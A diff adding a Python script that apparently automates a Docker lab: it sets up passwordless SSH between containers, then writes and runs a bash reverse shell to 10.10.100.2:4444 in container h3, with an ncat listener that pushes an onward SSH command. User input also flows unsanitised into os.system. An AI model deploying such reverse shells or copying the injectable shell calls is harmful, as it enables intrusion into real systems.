@@ -1,0 +1,49 @@
+import os
+
+import nc
+
+for k,i,j in zip(nc.containerlist,nc.iplist,nc.user):
+  print('con',k,"ip",i,"name",j)
+
+toend=input('Enter Yes: Password less login for ssh will be created. Enter "end" if you do not want to create more passwordless login')
+
+while toend != 'end':
+
+
+  containername=input('container in which you want to login without password')
+  cfromwhich=input('container from which')
+  for i in range(len(nc.containerlist)):
+    if nc.containerlist[i]==containername:
+      print("containername",nc.containerlist[i],'ip addr of',nc.iplist[i],'user for',nc.user[i])
+
+
+
+      print(f'docker exec -it {cfromwhich} ssh-keygen -t rsa')
+      os.system(f'docker exec -it {cfromwhich} ssh-keygen -t rsa')
+      print(f'docker exec -it {cfromwhich} scp /root/.ssh/id_rsa.pub {nc.user[i]}@{nc.iplist[i]}:/home/{nc.user[i]}')
+      os.system(f'docker exec -it {cfromwhich} scp /root/.ssh/id_rsa.pub {nc.user[i]}@{nc.iplist[i]}:/home/{nc.user[i]}')
+
+
+      print(f'docker exec {nc.containerlist[i]} mkdir /home/{nc.user[i]}/.ssh')
+      os.system(f'docker exec {nc.containerlist[i]} mkdir /home/{nc.user[i]}/.ssh')
+
+      print(f'docker exec {nc.containerlist[i]} cp /home/{nc.user[i]}/id_rsa.pub /home/{nc.user[i]}/.ssh/authorized_keys')
+      os.system(f'docker exec {nc.containerlist[i]} cp /home/{nc.user[i]}/id_rsa.pub /home/{nc.user[i]}/.ssh/authorized_keys')
+      print(f'docker exec -it {cfromwhich} ssh {nc.user[i]}@{nc.iplist[i]} exit ')
+      os.system(f'docker exec -it {cfromwhich} ssh {nc.user[i]}@{nc.iplist[i]} exit')
+      print('SSH without password from {cfromwhich} to {nc.containerlist[i]} ')
+
+    else:
+      pass
+  toend=input('Password less login for ssh will be created. Enter "end" if you do not want to create more passwordless login')
+
+
+
+os.system('docker exec h3 rm /root/reverse_nc.sh')
+os.system('''docker exec h3 bash -c "echo '#!/bin/bash' >> /root/reverse_nc.sh"''')
+os.system('''docker exec h3 bash -c "echo 'bash -i >& /dev/tcp/10.10.100.2/4444 0>&1' >> /root/reverse_nc.sh"''')
+os.system('docker exec h3 chmod +x /root/reverse_nc.sh')
+
+os.system('gnome-terminal -- bash -c "sleep 7s ; docker exec -it h3 bash /root/reverse_nc.sh ; exec bash" &')
+os.system('''docker exec -it h1 ssh hrr2@10.10.100.2 "printf 'ssh hrr4@10.10.100.4 python3 h.py' | ncat -lvp 4444"''')
+
